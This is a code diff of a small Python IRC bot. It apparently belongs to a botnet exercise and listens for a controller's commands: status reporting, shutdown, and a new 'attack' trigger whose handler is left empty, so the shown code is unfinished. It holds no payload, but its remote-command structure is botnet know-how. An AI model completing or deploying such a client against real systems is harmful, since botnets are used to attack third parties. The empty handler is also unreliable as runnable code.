@@ -22,7 +22,6 @@ nickname = "NotYourSlave"+str(number)
 irc.send(bytes("USER notabot 8 * : I'm OK\r\n", "utf-8"))
 irc.send(bytes("NICK " + nickname + "\r\n", "utf-8"))
 ready = select.select([irc], [], [], 1) # wait 1 second
-
 if ready[0]:
     response = (irc.recv(1024)).decode("utf-8")
     print(response)
@@ -44,16 +43,21 @@ while 1:
         response = (irc.recv(1024)).decode("utf-8")
         print(response)
     else:
-        print("", end="")
+        continue
 
     if response.split(" ", 1)[0] == "PING":
         argument = response.split(" ", 2)[1]
         irc.send(bytes("PONG " + argument + "\r\n", "utf-8"))
-        print("PONG " + argument)
 
+    # controller's status
     if "To me, my minions" in response:
         irc.send(bytes("PRIVMSG BetterThanYou :" + nickname +"\r\n", "utf-8"))
 
+    # controller's attack
+    if "Attack" in response:
+        
+
+    # controller's shutdown
     if "Go home, guys" in response:
         irc.send(bytes("QUIT\r\n", "utf-8"))
         sys.exit(0)
